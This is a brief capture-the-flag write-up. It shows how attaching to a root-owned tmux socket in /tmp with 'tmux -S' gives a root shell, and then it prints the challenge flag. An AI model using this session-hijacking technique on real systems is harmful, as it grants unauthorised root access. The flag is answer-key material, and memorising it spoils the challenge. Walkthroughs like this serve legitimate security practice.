Wow i wonder what this could possibly be


/tmp/ has some session files for tmux sessions including /tmp/tmux-0/tea_mix (btw s at the start of perms means unix socket NOT suid)
```
export TERM=xterm
set tty rows/cols to your own terminal
tmux -S /tmp/tmux-0/tea_mix
root shell
cat /root/flag.txt
```
#### Flag: flag{oooohhhh_tea_mix_sounds_like_tmux_i_get_it}
